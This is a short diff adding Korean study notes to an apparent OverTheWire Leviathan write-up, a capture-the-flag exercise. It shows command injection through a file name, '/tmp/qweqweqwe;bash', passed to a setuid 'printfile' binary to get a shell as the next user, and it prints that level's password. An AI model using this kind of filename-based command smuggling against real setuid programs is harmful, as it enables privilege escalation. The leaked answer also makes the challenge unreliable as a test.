@@ -20,3 +20,18 @@ system () :
 
 $ ./printfile /etc/leviathan_pass   #를 하니 /bin/cat 실행이 되며 디렉토리라는 것을 알려준다.
 
+도움요청!
+https://www.youtube.com/watch?v=R2gf1fHRjhI&list=PLilfVAwqeInU7x4gDwWdRlQ-41ta3HhAp
+
+중요한 키 포인트는 setreuid 이런것은 파일이 setuid로 설정돼있어서 이것이 파일을 실행할동안 그 
+권한으로 실행하는 어셈블리어이라는 것. 
+중요한 것은 ; 가 코드를 동시에 같이 실행할수 있게 하는 것이다. bash 
+
+# echo "levi" > "/tmp/qweqweqwe;bash"
+# ls "/tmp/qweqweqwe;bash"
+# ./printfile "/tmp/qweqweqwe;bash"
+ 로 진행을 하면은 권한이 leviathan3로 된것을 알수 있따.
+ 
+ 키 값 : Ahdiemoo1j
+
+ 
